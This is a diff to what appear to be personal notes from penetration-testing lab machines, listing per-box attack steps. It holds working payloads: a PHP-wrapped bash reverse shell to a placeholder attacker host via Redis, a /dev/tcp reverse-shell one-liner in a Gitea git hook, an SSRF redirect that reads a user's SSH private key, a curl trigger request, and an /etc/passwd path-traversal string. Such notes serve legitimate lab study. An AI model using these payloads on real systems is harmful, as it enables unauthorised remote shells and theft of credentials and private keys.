@@ -25,6 +25,13 @@
 2. Exploit = https://www.exploit-db.com/exploits/44340 on /etc/redis/redis.conf 
 3. In redis-cli `set test '<?php system("echo \"bash -i >& /dev/tcp/{{LHOST}}/4444 0>&1\" | bash"); ?>'` 
 
+#### Roquefort => Gitea git hook 
+1. Create repo & run git hook manually = `0<&196;exec 196<>/dev/tcp/{{LHOST}}/2222; sh <&196 >&196 2>&196` 
+
+#### Symbolic => SSRF for PDF uploads  
+1. **Must** use apache2 & 'header' => `<?php header('Location: file:///Users/{{USERNAME}}/.ssh/id_rsa'); ?>` 
+2. Run `curl -i -s -k -XPOST --data-binary 'url=192.168.36.128%2Findex.php' 'http://192.168.36.131/Process.php'` 
+
 #### Walla => RaspAP (Web) 
 1. When unsure just google default creds! 
 
@@ -32,6 +39,7 @@
 1. LFI in file path ~ "../../../../../../../etc/passwd" 
 2. Discover .db by looking in .bash_history 
 3. Whack `ls -al` and '--help' on weird executables! 
+
 
 ---- 
 
